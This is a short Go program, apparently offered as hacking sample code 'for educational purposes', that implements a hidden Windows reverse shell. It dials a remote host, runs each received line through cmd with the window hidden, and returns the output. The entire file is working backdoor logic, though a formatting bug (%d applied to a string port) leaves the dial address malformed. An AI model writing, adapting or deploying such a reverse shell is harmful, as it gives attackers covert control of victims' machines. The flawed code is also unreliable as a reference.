package main

/*

    Ahmad Dwiyan 
    
    For Educational Purpose Only !!!

*/

import (

	"bufio"
	"fmt"
	"net"
	"os/exec"
	"syscall"

)		


const(

	RHOST = "0.0.0.0"
	RPORT = "8001"

)


func main(){

	conn , err := net.Dial("tcp",fmt.Sprintf("%s:%d",RHOST,RPORT))
	
	if err != nil {
		if conn != nil {
			conn.Close()
			panic("Remote Host Is Off")
		}
		panic(err)	

	}

	reader := bufio.NewReader(conn)

	for {

		order , err := reader.ReadString('\n')

		if err != nil {
			 panic(err)
		}

	cmd := exec.Command("cmd","/C",order)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow : true}
	out , _ := cmd.CombinedOutput()
	conn.Write(out)

	}


}
